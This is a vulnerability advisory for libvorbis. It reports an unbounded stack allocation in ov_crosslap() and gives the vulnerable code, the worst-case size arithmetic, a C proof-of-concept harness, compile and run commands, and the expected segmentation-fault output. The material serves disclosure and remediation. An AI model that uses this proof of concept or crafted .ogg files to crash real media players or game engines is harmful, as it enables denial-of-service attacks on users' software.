### Summary

`ov_crosslap()` in `lib/vorbisfile.c` allocates stack memory via `alloca()` inside a loop bounded by `vi1->channels`. Since `channels` is parsed directly from the Ogg Vorbis file header with no upper bound check, a crafted file with `channels=255` and `blocksize=8192` triggers ~4MB of stack allocation — sufficient to overflow a worker thread stack (typically 1MB) and crash the process.

Confirmed on current master `8de70016`.

### Details

The vulnerable loop at line 2290:

```c
lappcm = alloca(sizeof(*lappcm) * vi1->channels);     // pointer array

for (i = 0; i < vi1->channels; i++)
    lappcm[i] = alloca(sizeof(**lappcm) * n1);        // line 2290: flagged
```

`alloca()` allocates on the stack and is never freed between iterations — stack grows linearly. Both values controlling allocation size come directly from the Ogg file header:

```c
vi1 = ov_info(vf1, -1);                           // channels parsed from header
n1  = vorbis_info_blocksize(vi1, 0) >> (1 + hs1); // derived from blocksize
```

Validation in `lib/info.c` only checks:

```c
if(vi->channels < 1) goto err_out;         // no upper bound
if(ci->blocksizes[1] > 8192) goto err_out; // hard limit
```

Worst case stack usage:

```
channels  = 255  (1 byte in header, only checked >= 1)
blocksize = 8192 (max per Vorbis spec)
n1        = 8192 >> 1 = 4096

Total = 255 × 4096 × sizeof(float) ≈ 4.17MB
```

### PoC

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <vorbis/vorbisfile.h>

typedef struct { OggVorbis_File vf1; OggVorbis_File vf2; } Args;

void *trigger(void *arg) {
    Args *a = (Args *)arg;
    vorbis_info *vi = ov_info(&a->vf1, -1);
    printf("[*] channels=%d blocksize=%d (~%zu bytes stack)\n",
           vi->channels,
           vorbis_info_blocksize(vi, 0),
           (size_t)vi->channels * vorbis_info_blocksize(vi, 0) * sizeof(float));
    printf("[*] Calling ov_crosslap()...\n");
    ov_crosslap(&a->vf1, &a->vf2);
    printf("[-] Should not reach here\n");
    return NULL;
}

int main(int argc, char *argv[]) {
    Args a; memset(&a, 0, sizeof(a));
    ov_open(fopen(argv[1], "rb"), &a.vf1, NULL, 0);
    ov_open(fopen(argv[2], "rb"), &a.vf2, NULL, 0);

    pthread_t t; pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 1024 * 1024); /* 1MB worker thread */
    printf("[!] Spawning worker thread with 1MB stack...\n\n");
    pthread_create(&t, &attr, trigger, &a);
    pthread_join(t, NULL);
    return 0;
}
```

Compile & run:

```bash
gcc -O0 -o poc poc.c -lvorbisfile -lvorbis -logg -lpthread
./poc evil.ogg normal.ogg
```

Expected output:

```
[!] Spawning worker thread with 1MB stack...

[*] channels=255 blocksize=8192 (~4177920 bytes stack)
[*] Calling ov_crosslap()...
Segmentation fault (core dumped)
```

### Impact

Any application calling `ov_crosslap()` in a worker thread with a stack smaller than ~4MB will crash when processing a crafted `.ogg` file — resulting in a Denial of Service. Media players and game engines commonly use worker threads with 512KB–1MB stacks for audio decoding.

### Credit
- Luong Trieu Dai / Hoang Huy - Remediation verify
- VulnHunterX — Bug verifycation framework
